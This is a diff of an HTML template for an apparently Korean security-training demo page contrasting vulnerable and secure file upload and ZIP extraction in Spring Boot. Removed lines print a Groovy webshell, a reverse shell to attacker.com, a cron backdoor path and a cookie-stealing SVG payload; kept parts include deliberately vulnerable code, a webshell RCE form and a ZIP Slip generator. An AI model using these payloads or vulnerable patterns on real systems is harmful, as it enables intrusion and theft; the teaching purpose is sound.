@@ -4,123 +4,36 @@
 <body>
 <nav th:replace="~{fragments/navbar :: navbar}"></nav>
 
-<div class="container py-4">
-    <div class="mb-4">
-        <div class="demo-nav">
-            <a th:href="@{/demo}">← 데모 목록</a>
-            <a th:href="@{/demo/sql-injection}">SQL Injection</a>
-            <a th:href="@{/demo/xss}">XSS</a>
-            <a class="active" th:href="@{/demo/file-upload}">파일 업로드</a>
-            <a th:href="@{/demo/path-traversal}">경로 순회</a>
-        </div>
-        <h2 class="fw-bold">파일 업로드 취약점</h2>
-        <p class="text-muted">확장자 검사 없이 파일을 업로드 허용 시, 웹쉘 업로드 및 ZIP Slip을 통한 임의 파일 쓰기가 가능합니다.</p>
-        <span class="badge bg-dark">OWASP A04: Insecure Design</span>
-        <span class="badge bg-secondary ms-1">CWE-434</span>
-        <span class="badge bg-secondary ms-1">CWE-22 (ZIP Slip)</span>
+<div class="container">
+    <div class="mb">
+        <h2 class="bold">파일 업로드 취약점</h2>
+        <p class="text-muted">확장자 검사 없이 파일 업로드 허용 시 웹쉘 업로드 및 ZIP Slip을 통한 임의 파일 쓰기 가능</p>
     </div>
 
-    <!-- ===== 공격 파일 유형 안내 ===== -->
-    <h5 class="fw-bold border-bottom pb-2 mb-3">공격 파일 유형 — Spring Boot 환경 기준</h5>
+    <!-- 기본 업로드 -->
+    <h5 class="section-heading">기본 파일 업로드 (확장자 검사)</h5>
+    <div class="row mb-lg">
 
-    <!-- Groovy -->
-    <div class="attack-hint mb-3">
-        <strong>① Groovy 웹쉘 (shell.groovy) — Spring Boot + Groovy 환경</strong>
-        <div class="code-block-wrap mt-2">
-            <button class="btn-copy-block" onclick="copyBlock(this)">복사</button>
-            <div class="code-block">// Groovy webshell - executed by Groovy script engine
-def cmd = request.getParameter("cmd")
-def proc = ["bash", "-c", cmd].execute()
-out.println(proc.text)</div>
-        </div>
-        <small class="d-block mt-1">
-            → Spring Boot가 Groovy 스크립트 실행 엔드포인트를 노출하거나,
-            <code>GroovyShell.evaluate()</code> 등을 통해 파일을 실행하는 경우 RCE 가능.<br>
-            → Groovy가 classpath에 있고 앱이 업로드된 스크립트를 실행하면 동작.
-        </small>
-        <div class="mt-2 p-2 border rounded" style="font-size:.82rem; background:#f8f9fa;">
-            <strong>적용 조건:</strong> <code>pom.xml</code>에 <code>groovy</code> 의존성 + 서버가 .groovy 파일을 실행하는 로직 존재
-        </div>
-    </div>
-
-    <!-- Linux shell script -->
-    <div class="attack-hint mb-3">
-        <strong>② Linux 쉘 스크립트 (backdoor.sh) — cron / 스크립트 실행 환경</strong>
-        <div class="code-block-wrap mt-2">
-            <button class="btn-copy-block" onclick="copyBlock(this)">복사</button>
-            <div class="code-block">#!/bin/bash
-# Reverse shell - connect back to attacker
-bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1</div>
-        </div>
-        <div class="code-block-wrap mt-2">
-            <button class="btn-copy-block" onclick="copyBlock(this)">복사</button>
-            <div class="code-block"># cron job injection - write to /etc/cron.d/ via path traversal
-# filename: ../../etc/cron.d/backdoor
-* * * * * root bash /tmp/backdoor.sh</div>
-        </div>
-        <small class="d-block mt-1">
-            → <strong>직접 업로드만으로는 실행 불가.</strong>
-            Path Traversal과 결합하여 <code>/etc/cron.d/</code>에 파일을 쓰거나,
-            서버가 업로드된 .sh를 실행하는 로직이 있을 때 유효.
-        </small>
-        <div class="mt-2 p-2 border rounded" style="font-size:.82rem; background:#f8f9fa;">
-            <strong>공격 체인 예시:</strong> 파일 업로드(취약) + 경로 순회 → <code>/etc/cron.d/backdoor</code>에 쉘 스크립트 작성 → 1분 후 cron이 root 권한으로 실행
-        </div>
-    </div>
-
-    <!-- SVG / HTML -->
-    <div class="attack-hint mb-3">
-        <strong>③ SVG / HTML — 브라우저 XSS (서버 실행 없이 쿠키 탈취)</strong>
-        <div class="code-block-wrap mt-2">
-            <button class="btn-copy-block" onclick="copyBlock(this)">복사</button>
-            <div class="code-block">&lt;!-- payload.svg --&gt;
-&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
-  &lt;script&gt;
-    new Image().src='/demo/steal?c='+document.cookie;
-    alert('SVG XSS: ' + document.cookie);
-  &lt;/script&gt;
-&lt;/svg&gt;</div>
-        </div>
-        <small class="d-block mt-1">→ 업로드된 SVG를 브라우저로 직접 열면 스크립트 실행. 서버 실행 불필요.</small>
-    </div>
-
-    <!-- Extension bypass -->
-    <div class="attack-hint mb-4">
-        <strong>④ 확장자 필터 우회 기법</strong>
-        <ul class="mb-0 mt-1">
-            <li>이중 확장자: <code>shell.jpg.groovy</code><button class="btn-copy" onclick="copyCode(this)">복사</button></li>
-            <li>대소문자: <code>shell.SH</code> / <code>shell.Sh</code><button class="btn-copy" onclick="copyCode(this)">복사</button></li>
-            <li>null 바이트 (구형 서버): <code>shell.sh%00.jpg</code><button class="btn-copy" onclick="copyCode(this)">복사</button></li>
-            <li>Content-Type 위조: <code>image/jpeg</code>로 전송하면서 실제 내용은 스크립트</li>
-        </ul>
-    </div>
-
-    <!-- ===== 섹션 1: 기본 업로드 ===== -->
-    <h5 class="fw-bold border-bottom pb-2 mb-3">기본 파일 업로드 (확장자 검사)</h5>
-    <div class="row g-4 mb-5">
-
-        <!-- 취약한 업로드 -->
-        <div class="col-lg-6">
+        <div class="col">
             <div class="demo-panel demo-panel--vulnerable">
                 <div class="panel-header">
-                    <h6 class="fw-bold mb-0">[취약] 검증 없는 업로드</h6>
+                    <h6 class="bold">[취약] 검증 없는 업로드</h6>
                 </div>
-                <ul class="small text-muted mb-3">
-                    <li>확장자 검사 없음 → .jsp, .php, .groovy, .sh 모두 허용</li>
-                    <li>원본 파일명 그대로 저장 → 경로 예측 가능</li>
-                    <li>파일 내용 검사 없음</li>
+                <ul class="small text-muted mb">
+                    <li>확장자 검사 없음 (.jsp, .groovy, .sh 모두 허용)</li>
+                    <li>원본 파일명 그대로 저장 (경로 예측 가능)</li>
                 </ul>
                 <form th:action="@{/demo/file-upload/vuln}" method="post" enctype="multipart/form-data">
-                    <div class="mb-2">
-                        <input type="file" class="form-control" name="file">
+                    <div class="mb-sm">
+                        <input type="file" name="file">
                     </div>
-                    <button type="submit" class="btn btn-dark">업로드</button>
+                    <button type="submit" class="btn">업로드</button>
                 </form>
 
-                <div th:if="${vulnResult != null}" class="mt-3">
+                <div th:if="${vulnResult != null}" id="vuln-result" class="mt">
                     <div class="result-box" th:classappend="${vulnResult.success} ? 'result-box--error' : 'result-box--info'">
                         <div th:text="${vulnResult.message}"></div>
-                        <div th:if="${vulnResult.success}" class="mt-1">
+                        <div th:if="${vulnResult.success}" class="mt-sm">
                             <small>
                                 원본 파일명: <code th:text="${vulnResult.originalName}"></code><br>
                                 저장 경로: <code th:text="${vulnResult.savedPath}"></code>
@@ -129,40 +42,36 @@ bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1</div>
                     </div>
                 </div>
 
-                <div class="mt-3">
-                    <small class="text-muted">실제 코드 (FileService.java):</small>
-                    <div class="code-block-wrap">
-                        <button class="btn-copy-block" onclick="copyBlock(this)">복사</button>
-                        <div class="code-block">// VULN: save with original filename
+                <div class="mt">
+                    <small class="text-muted">FileService.java:</small>
+                    <div class="code-block">// 원본 파일명 저장
 String originalFilename = file.getOriginalFilename();
 Path dest = dir.resolve(originalFilename);
 file.transferTo(dest.toFile());</div>
-                    </div>
                 </div>
             </div>
         </div>
 
-        <!-- 안전한 업로드 -->
-        <div class="col-lg-6">
+        <div class="col">
             <div class="demo-panel demo-panel--secure">
                 <div class="panel-header">
-                    <h6 class="fw-bold mb-0">[안전] 화이트리스트 검증</h6>
+                    <h6 class="bold">[안전] 화이트리스트 검증</h6>
                 </div>
-                <div class="result-box result-box--info mb-3">
+                <div class="result-box result-box--info mb">
                     <strong>허용 확장자:</strong> jpg, jpeg, png, gif, pdf, txt, docx, xlsx, zip<br>
                     <strong>방어 원리:</strong> 화이트리스트 + UUID 랜덤 파일명
                 </div>
                 <form th:action="@{/demo/file-upload/secure}" method="post" enctype="multipart/form-data">
-                    <div class="mb-2">
-                        <input type="file" class="form-control" name="file">
+                    <div class="mb-sm">
+                        <input type="file" name="file">
                     </div>
-                    <button type="submit" class="btn btn-outline-dark">업로드</button>
+                    <button type="submit" class="btn btn-outline">업로드</button>
                 </form>
 
-                <div th:if="${secureResult != null}" class="mt-3">
+                <div th:if="${secureResult != null}" id="secure-result" class="mt">
                     <div class="result-box" th:classappend="${secureResult.success} ? 'result-box--info' : 'result-box--error'">
                         <div th:text="${secureResult.message}"></div>
-                        <div th:if="${secureResult.success}" class="mt-1">
+                        <div th:if="${secureResult.success}" class="mt-sm">
                             <small>
                                 원본: <code th:text="${secureResult.originalName}"></code><br>
                                 저장(랜덤): <code th:text="${secureResult.savedName}"></code>
@@ -171,201 +80,170 @@ file.transferTo(dest.toFile());</div>
                     </div>
                 </div>
 
-                <div class="mt-3">
-                    <small class="text-muted">실제 코드 (FileService.java):</small>
-                    <div class="code-block-wrap">
-                        <button class="btn-copy-block" onclick="copyBlock(this)">복사</button>
-                        <div class="code-block">// SAFE: whitelist check
+                <div class="mt">
+                    <small class="text-muted">FileService.java:</small>
+                    <div class="code-block">// 화이트리스트
 if (!ALLOWED_EXTENSIONS.contains(extension)) {
-    return "Disallowed file type";
+    return "허용되지 않은 파일 형식";
 }
-// SAFE: UUID random filename
+// UUID 파일명
 String savedName = UUID.randomUUID() + "." + extension;
 file.transferTo(dir.resolve(savedName).toFile());</div>
-                    </div>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- ===== 섹션 2: 웹쉘 실행 ===== -->
-    <h5 class="fw-bold border-bottom pb-2 mb-3">웹쉘 실행 — 업로드 후 RCE 시연</h5>
-    <p class="text-muted small mb-3">
-        위 [취약] 업로드로 <code>webshell.jsp</code>를 올린 뒤, 아래에서 명령어를 실행하세요.<br>
-        실제 공격자는 <code>/demo/file-upload/webshell?cmd=whoami</code> 같은 URL로 직접 접근합니다.
-    </p>
-    <div class="row g-4 mb-5">
-        <div class="col-lg-8">
+    <!-- 웹쉘 실행 -->
+    <h5 class="section-heading">웹쉘 실행 (업로드 후 RCE 시연)</h5>
+    <p class="text-muted small mb">위 [취약] 업로드로 <code>webshell.jsp</code>를 올린 뒤 아래에서 명령어를 실행하세요</p>
+    <div class="row mb-lg">
+        <div class="col-wide">
             <div class="demo-panel demo-panel--vulnerable">
                 <div class="panel-header">
-                    <h6 class="fw-bold mb-0">[취약] 업로드된 webshell.jsp 실행</h6>
+                    <h6 class="bold">[취약] 업로드된 webshell.jsp 실행</h6>
                 </div>
                 <form th:action="@{/demo/file-upload/webshell}" method="get">
-                    <div class="input-group mb-2">
-                        <span class="input-group-text" style="font-size:.85rem;">?cmd=</span>
-                        <input type="text" class="form-control font-monospace"
-                               name="cmd" placeholder="whoami"
-                               th:value="${webshellCmd}">
-                        <button type="submit" class="btn btn-dark">실행</button>
+                    <div class="input-row mb-sm">
+                        <span class="input-prefix">?cmd=</span>
+                        <input type="text" class="mono" name="cmd" placeholder="whoami" th:value="${webshellCmd}">
+                        <button type="submit" class="btn">실행</button>
                     </div>
                 </form>
-                <div class="mt-1 mb-3">
-                    <small class="text-muted">직접 URL 접근도 동일:&nbsp;</small>
-                    <code style="font-size:.8rem;">/demo/file-upload/webshell?cmd=whoami</code>
-                </div>
+                <small class="text-muted">직접 URL 접근도 동일: <code>/demo/file-upload/webshell?cmd=whoami</code></small>
 
-                <div th:if="${webshellResult != null}">
-                    <!-- 웹쉘 미업로드 -->
+                <div th:if="${webshellResult != null}" id="webshell-result" class="mt">
                     <div th:if="${!webshellResult.shellExists}" class="result-box result-box--info">
                         <div th:text="${webshellResult.output}"></div>
                     </div>
-                    <!-- 웹쉘 존재 -->
                     <div th:if="${webshellResult.shellExists}">
                         <div class="result-box result-box--error">
-                            <small class="fw-bold d-block mb-1">
-                                웹쉘 존재 확인: <code th:text="${webshellResult.shellPath}"></code>
+                            <small class="bold" style="display:block; margin-bottom:.25rem">
+                                웹쉘 존재: <code th:text="${webshellResult.shellPath}"></code>
                             </small>
-                            <small class="fw-bold d-block mb-1">실행 결과:</small>
+                            <small class="bold" style="display:block; margin-bottom:.25rem">실행 결과:</small>
                             <pre style="margin:0; white-space:pre-wrap; font-size:.85rem;"
                                  th:text="${webshellResult.output}"></pre>
                         </div>
                     </div>
                 </div>
 
-                <div class="mt-3">
+                <div class="mt">
                     <small class="text-muted">공격 흐름:</small>
                     <div class="code-block" style="font-size:.8rem;">1. POST /demo/file-upload/vuln  → webshell.jsp 업로드
 2. GET  /demo/file-upload/webshell?cmd=whoami  → RCE 실행
-3. GET  /demo/file-upload/webshell?cmd=dir     → 디렉토리 열람
-4. GET  /demo/file-upload/webshell?cmd=hostname → 서버 정보 탈취</div>
+3. GET  /demo/file-upload/webshell?cmd=dir     → 디렉토리 열람</div>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- ===== 섹션 3: ZIP Slip ===== -->
-    <h5 class="fw-bold border-bottom pb-2 mb-3">ZIP Slip — Java 환경 고유 취약점 (CWE-22)</h5>
-    <p class="text-muted small mb-3">
-        ZIP 내 파일 경로에 <code>../</code>를 포함시키면, 압축 해제 시 서버의 임의 경로에 파일을 덮어쓸 수 있습니다.
-        <strong>화이트리스트로 .zip을 허용해도 이 공격은 여전히 가능합니다.</strong>
+    <!-- ZIP Slip -->
+    <h5 class="section-heading">ZIP Slip (압축 해제 경로 탈출)</h5>
+    <p class="text-muted small mb">
+        ZIP 내 파일 경로에 <code>../</code>를 포함시키면 압축 해제 시 서버 임의 경로에 파일을 덮어쓸 수 있음.
+        <strong>화이트리스트로 .zip을 허용해도 이 공격은 여전히 가능함</strong>
     </p>
 
-    <div class="attack-hint mb-4">
-        <strong>악성 ZIP 생성 방법 (Python):</strong>
-        <div class="code-block-wrap mt-2">
-            <button class="btn-copy-block" onclick="copyBlock(this)">복사</button>
-            <div class="code-block">import zipfile
+    <div class="attack-hint mb">
+        <strong>악성 ZIP 생성 (Python):</strong>
+        <div class="code-block mt-sm">import zipfile
 
-# Creates zip with path traversal entry
 zf = zipfile.ZipFile('zipslip.zip', 'w')
-zf.writestr('../../uploads/pwned.txt', 'ZIP Slip success! File written outside extract dir.')
-zf.writestr('normal.txt', 'This is a normal file.')
-zf.close()
-print("Created zipslip.zip")</div>
-        </div>
-        <small class="d-block mt-1">→ 위 스크립트로 <code>zipslip.zip</code> 생성 후 아래 취약 업로드에 올려보세요.</small>
-
-        <strong class="d-block mt-3">실제 공격 시나리오:</strong>
-        <ul class="mb-0">
-            <li><code>../../src/main/resources/application.properties</code> → DB 설정 덮어쓰기</li>
-            <li><code>../../etc/cron.d/backdoor</code> → cron job 심기 (Linux, root 권한 필요)</li>
-            <li><code>../../uploads/999/shell.jsp</code> → 다른 경로에 웹쉘 쓰기</li>
-        </ul>
+zf.writestr('../../uploads/pwned.txt', 'ZIP Slip 성공')
+zf.writestr('normal.txt', '정상 파일')
+zf.close()</div>
+        <small style="display:block; margin-top:.5rem">위 스크립트로 zipslip.zip 생성 후 아래 취약 업로드에 올려보세요</small>
     </div>
 
-    <div class="row g-4">
+    <div class="row">
 
-        <!-- 취약한 ZIP 해제 -->
-        <div class="col-lg-6">
+        <div class="col">
             <div class="demo-panel demo-panel--vulnerable">
                 <div class="panel-header">
-                    <h6 class="fw-bold mb-0">[취약] 경로 검증 없는 ZIP 해제</h6>
+                    <h6 class="bold">[취약] 경로 검증 없는 ZIP 해제</h6>
                 </div>
-                <ul class="small text-muted mb-3">
+                <ul class="small text-muted mb">
                     <li>ZIP 엔트리 이름을 그대로 경로로 사용</li>
                     <li><code>../</code> 포함 시 압축 해제 디렉토리 탈출</li>
-                    <li>임의 경로에 파일 쓰기 가능</li>
                 </ul>
                 <form th:action="@{/demo/file-upload/zip/vuln}" method="post" enctype="multipart/form-data">
-                    <div class="mb-2">
-                        <input type="file" class="form-control" name="file" accept=".zip">
+                    <div class="mb-sm">
+                        <input type="file" name="file" accept=".zip">
                     </div>
-                    <button type="submit" class="btn btn-dark">ZIP 해제</button>
+                    <button type="submit" class="btn">ZIP 해제</button>
                 </form>
 
-                <div th:if="${zipVulnResult != null}" class="mt-3">
+                <div th:if="${zipVulnResult != null}" id="zip-vuln-result" class="mt">
                     <div class="result-box" th:classappend="${zipVulnResult.success} ? 'result-box--error' : 'result-box--info'">
                         <div th:text="${zipVulnResult.message}"></div>
-                        <div th:if="${zipVulnResult.success and not #lists.isEmpty(zipVulnResult.extracted)}" class="mt-2">
-                            <small class="fw-bold">해제된 파일 (실제 저장 경로):</small>
-                            <div th:each="f : ${zipVulnResult.extracted}" class="code-block mt-1" style="font-size:.78rem;" th:text="${f}"></div>
+                        <div th:if="${zipVulnResult.success and not #lists.isEmpty(zipVulnResult.extracted)}" class="mt-sm">
+                            <small class="bold">해제된 파일 (실제 저장 경로):</small>
+                            <div th:each="f : ${zipVulnResult.extracted}" class="code-block mt-sm" style="font-size:.78rem;" th:text="${f}"></div>
                         </div>
                     </div>
                 </div>
 
-                <div class="mt-3">
-                    <small class="text-muted">실제 코드 (FileService.java):</small>
-                    <div class="code-block-wrap">
-                        <button class="btn-copy-block" onclick="copyBlock(this)">복사</button>
-                        <div class="code-block">// VULN: entry name used directly - ../ escapes extractDir
+                <div class="mt">
+                    <small class="text-muted">FileService.java:</small>
+                    <div class="code-block">// 엔트리명 직접 사용
 Path dest = extractDir.resolve(entry.getName());
 Files.copy(zis, dest, REPLACE_EXISTING);</div>
-                    </div>
                 </div>
             </div>
         </div>
 
-        <!-- 안전한 ZIP 해제 -->
-        <div class="col-lg-6">
+        <div class="col">
             <div class="demo-panel demo-panel--secure">
                 <div class="panel-header">
-                    <h6 class="fw-bold mb-0">[안전] normalize + startsWith 검증</h6>
+                    <h6 class="bold">[안전] normalize + startsWith 검증</h6>
                 </div>
-                <div class="result-box result-box--info mb-3">
+                <div class="result-box result-box--info mb">
                     <strong>방어 원리:</strong><br>
                     1. <code>normalize()</code>로 <code>../</code> 제거<br>
                     2. <code>startsWith(extractDir)</code>로 탈출 감지<br>
                     3. 탈출 시도 엔트리는 건너뜀
                 </div>
                 <form th:action="@{/demo/file-upload/zip/secure}" method="post" enctype="multipart/form-data">
-                    <div class="mb-2">
-                        <input type="file" class="form-control" name="file" accept=".zip">
+                    <div class="mb-sm">
+                        <input type="file" name="file" accept=".zip">
                     </div>
-                    <button type="submit" class="btn btn-outline-dark">ZIP 해제</button>
+                    <button type="submit" class="btn btn-outline">ZIP 해제</button>
                 </form>
 
-                <div th:if="${zipSecureResult != null}" class="mt-3">
+                <div th:if="${zipSecureResult != null}" id="zip-secure-result" class="mt">
                     <div class="result-box result-box--info">
                         <div th:text="${zipSecureResult.message}"></div>
-                        <div th:if="${zipSecureResult.success and not #lists.isEmpty(zipSecureResult.extracted)}" class="mt-2">
-                            <small class="fw-bold text-success">허용된 파일:</small>
-                            <div th:each="f : ${zipSecureResult.extracted}" class="code-block mt-1" style="font-size:.78rem;" th:text="${f}"></div>
+                        <div th:if="${zipSecureResult.success and not #lists.isEmpty(zipSecureResult.extracted)}" class="mt-sm">
+                            <small class="bold">허용된 파일:</small>
+                            <div th:each="f : ${zipSecureResult.extracted}" class="code-block mt-sm" style="font-size:.78rem;" th:text="${f}"></div>
                         </div>
-                        <div th:if="${zipSecureResult.success and not #lists.isEmpty(zipSecureResult.blocked)}" class="mt-2">
-                            <small class="fw-bold">차단된 엔트리:</small>
-                            <div th:each="f : ${zipSecureResult.blocked}" class="code-block mt-1" style="font-size:.78rem; border-left: 3px solid #dc3545;" th:text="${f}"></div>
+                        <div th:if="${zipSecureResult.success and not #lists.isEmpty(zipSecureResult.blocked)}" class="mt-sm">
+                            <small class="bold">차단된 엔트리:</small>
+                            <div th:each="f : ${zipSecureResult.blocked}" class="code-block mt-sm" style="font-size:.78rem; border-left: 3px solid #dc3545;" th:text="${f}"></div>
                         </div>
                     </div>
                 </div>
 
-                <div class="mt-3">
-                    <small class="text-muted">실제 코드 (FileService.java):</small>
-                    <div class="code-block-wrap">
-                        <button class="btn-copy-block" onclick="copyBlock(this)">복사</button>
-                        <div class="code-block">// SAFE: normalize and verify stays within extractDir
+                <div class="mt">
+                    <small class="text-muted">FileService.java:</small>
+                    <div class="code-block">// normalize + startsWith
 Path dest = extractDir.resolve(entry.getName()).normalize();
 if (!dest.startsWith(extractDir)) {
-    // BLOCK - path traversal detected
-    continue;
+    continue; // 경로 탈출 차단
 }
 Files.copy(zis, dest, REPLACE_EXISTING);</div>
-                    </div>
                 </div>
             </div>
         </div>
     </div>
 </div>
 
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    var result = document.querySelector('#vuln-result, #secure-result, #webshell-result, #zip-vuln-result, #zip-secure-result');
+    if (result) result.scrollIntoView({behavior: 'smooth', block: 'nearest'});
+});
+</script>
 </body>
 </html>
